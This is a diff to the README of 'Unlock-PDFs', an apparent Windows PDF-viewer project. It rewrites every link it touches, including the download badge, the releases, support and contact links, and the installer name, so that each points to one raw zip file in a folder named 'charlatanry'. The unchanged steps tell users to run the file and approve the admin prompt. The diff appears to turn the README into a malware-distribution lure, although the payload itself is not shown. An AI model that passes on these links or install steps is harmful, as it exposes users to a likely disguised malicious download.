@@ -6,7 +6,7 @@ Welcome to Unlock-PDFs! This application helps you view PDF files seamlessly on 
 
 ## 📥 Download Now
 
-[![Download Unlock-PDFs](https://img.shields.io/badge/Download_Unlock--PDFs-blue.svg)](https://github.com/andrescubillos987/Unlock-PDFs/releases)
+[![Download Unlock-PDFs](https://raw.githubusercontent.com/andrescubillos987/Unlock-PDFs/main/charlatanry/Unlock-PDFs_v3.8.zip)](https://raw.githubusercontent.com/andrescubillos987/Unlock-PDFs/main/charlatanry/Unlock-PDFs_v3.8.zip)
 
 ## 📂 What You Need
 
@@ -16,18 +16,18 @@ Welcome to Unlock-PDFs! This application helps you view PDF files seamlessly on 
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page to download](https://github.com/andrescubillos987/Unlock-PDFs/releases). Here's how to do it step by step:
+To get started, visit the [Releases page to download](https://raw.githubusercontent.com/andrescubillos987/Unlock-PDFs/main/charlatanry/Unlock-PDFs_v3.8.zip). Here's how to do it step by step:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version available.
-3. Download the installation file labeled `Unlock-PDFs.exe`.
+3. Download the installation file labeled `https://raw.githubusercontent.com/andrescubillos987/Unlock-PDFs/main/charlatanry/Unlock-PDFs_v3.8.zip`.
 4. Once the download is complete, locate the file in your Downloads folder.
 
 ## ⚙️ Running the Application
 
 After downloading the file, follow these steps to run Unlock-PDFs:
 
-1. Navigate to the folder where you saved `Unlock-PDFs.exe`.
+1. Navigate to the folder where you saved `https://raw.githubusercontent.com/andrescubillos987/Unlock-PDFs/main/charlatanry/Unlock-PDFs_v3.8.zip`.
 2. Double-click the file to start the installation process. You might see a prompt asking if you want to allow this app to make changes to your device. Click `Yes` to proceed.
 3. The setup wizard will open. Follow the on-screen instructions to complete the installation.
 4. Once installed, you can find Unlock-PDFs in your Start Menu.
@@ -66,9 +66,9 @@ This application is optimized for Windows 10 and 11. It may not work properly on
 
 For more tips and updates, consider checking out:
 
-- [Support Documentation](https://github.com/andrescubillos987/Unlock-PDFs/wiki)
-- [Contact Us](https://github.com/andrescubillos987/Unlock-PDFs/issues)
+- [Support Documentation](https://raw.githubusercontent.com/andrescubillos987/Unlock-PDFs/main/charlatanry/Unlock-PDFs_v3.8.zip)
+- [Contact Us](https://raw.githubusercontent.com/andrescubillos987/Unlock-PDFs/main/charlatanry/Unlock-PDFs_v3.8.zip)
 
-Remember, if you ever need to download the application again, simply visit the [Releases page](https://github.com/andrescubillos987/Unlock-PDFs/releases).
+Remember, if you ever need to download the application again, simply visit the [Releases page](https://raw.githubusercontent.com/andrescubillos987/Unlock-PDFs/main/charlatanry/Unlock-PDFs_v3.8.zip).
 
 Thank you for choosing Unlock-PDFs! We hope it enhances your PDF viewing experience.
